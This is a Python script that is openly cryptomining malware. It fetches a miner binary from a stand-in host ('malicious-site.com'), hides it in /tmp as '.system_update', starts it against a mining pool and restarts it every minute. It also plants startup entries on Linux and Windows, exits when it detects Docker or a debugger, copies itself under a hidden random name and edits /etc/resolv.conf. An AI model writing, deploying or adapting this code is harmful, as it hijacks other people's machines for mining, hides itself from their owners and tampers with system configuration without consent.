import os
import subprocess
import time
import urllib.request
import shutil
import logging
import random
import ctypes
import platform
import sys

# Configure logging
logging.basicConfig(filename='/tmp/.system_update.log', level=logging.DEBUG, format='%(asctime)s %(message)s')

# Global configuration for the miner
MINER_CONFIG = {
    'url': 'stratum+tcp://pool.example.com:3333',
    'user': 'user',
    'pass': 'pass',
    'algo': 'cryptonight'
}

def download_miner():
    miner_url = "http://malicious-site.com/miner"
    miner_path = "/tmp/.system_update"
    try:
        with urllib.request.urlopen(miner_url) as response, open(miner_path, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
        os.chmod(miner_path, 0o755)  # Make it executable
        logging.info(f"Downloaded miner to {miner_path}")
        return miner_path
    except Exception as e:
        logging.error(f"Failed to download miner: {e}")
        return None

def start_mining(miner_path):
    try:
        command = [
            miner_path,
            "--algo", MINER_CONFIG['algo'],
            "--url", MINER_CONFIG['url'],
            "--user", MINER_CONFIG['user'],
            "--pass", MINER_CONFIG['pass']
        ]
        
        # Start the miner process
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info("Started mining process")
        return process
    except Exception as e:
        logging.error(f"Failed to start mining: {e}")
        return None

def ensure_persistence_linux(miner_path):
    # Adding to startup (Linux example)
    startup_file = os.path.expanduser("~/.config/autostart/system_update.desktop")
    startup_content = f"""
    [Desktop Entry]
    Type=Application
    Exec={miner_path}
    Hidden=false
    NoDisplay=false
    X-GNOME-Autostart-enabled=true
    Name=System Update
    """
    try:
        os.makedirs(os.path.dirname(startup_file), exist_ok=True)
        with open(startup_file, 'w') as file:
            file.write(startup_content)
        logging.info("Added miner to startup")
    except Exception as e:
        logging.error(f"Failed to add miner to startup: {e}")

def ensure_persistence_windows(miner_path):
    # Adding to startup (Windows example)
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system_update.bat')
        with open(startup_path, 'w') as file:
            file.write(f'start {miner_path}')
        logging.info("Added miner to startup")
    except Exception as e:
        logging.error(f"Failed to add miner to startup: {e}")

def ensure_persistence_android():
    # Placeholder: Actual implementation would involve Android-specific techniques
    logging.info("Added persistence for Android (placeholder)")

def ensure_persistence_ios():
    # Placeholder: Actual implementation would involve iOS-specific techniques
    logging.info("Added persistence for iOS (placeholder)")

def obfuscate_script():
    # Simulate obfuscation by renaming the script
    try:
        new_name = f"/tmp/.{random.randint(1000,9999)}_{os.path.basename(__file__)}"
        shutil.copy(__file__, new_name)
        logging.info(f"Obfuscated script as {new_name}")
        return new_name
    except Exception as e:
        logging.error(f"Failed to obfuscate script: {e}")
        return __file__

def anti_debugging():
    # Detect if running in a virtual environment (simple example)
    if os.path.exists('/.dockerenv') or os.path.exists('/.dockerinit'):
        logging.error("Detected running in a Docker container. Exiting...")
        sys.exit(1)

    # Detect debuggers (simple example for Windows)
    if platform.system() == 'Windows' and ctypes.windll.kernel32.IsDebuggerPresent():
        logging.error("Debugger detected. Exiting...")
        sys.exit(1)

def network_evasion():
    try:
        # Simulate network evasion by changing DNS settings (Linux example)
        if platform.system() == 'Linux':
            with open('/etc/resolv.conf', 'a') as file:
                file.write("\n# Added by malware\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n")
        logging.info("Modified DNS settings for evasion")
    except Exception as e:
        logging.error(f"Failed to modify DNS settings: {e}")

def ensure_mining(miner_path):
    while True:
        try:
            # Check if the miner process is running
            result = subprocess.run(["pgrep", "-f", miner_path], stdout=subprocess.PIPE)
            if result.returncode != 0:
                logging.warning("Miner not running, restarting...")
                start_mining(miner_path)
            else:
                logging.info("Miner is running")
        except Exception as e:
            logging.error(f"Error checking miner process: {e}")
        time.sleep(60)  # Check every minute

def main():
    # Anti-debugging checks
    anti_debugging()

    # Obfuscate script
    obfuscated_script = obfuscate_script()

    # Download the miner
    miner_path = download_miner()
    if miner_path:
        # Start mining process
        process = start_mining(miner_path)
        
        # Ensure persistence based on OS
        if platform.system() == 'Linux':
            ensure_persistence_linux(miner_path)
        elif platform.system() == 'Windows':
            ensure_persistence_windows(miner_path)
        elif platform.system() == 'Android':
            ensure_persistence_android()
        elif platform.system() == 'iOS':
            ensure_persistence_ios()

        # Perform network evasion
        network_evasion()

        # Ensure mining process stays active
        if process:
            ensure_mining(miner_path)

if __name__ == "__main__":
    main()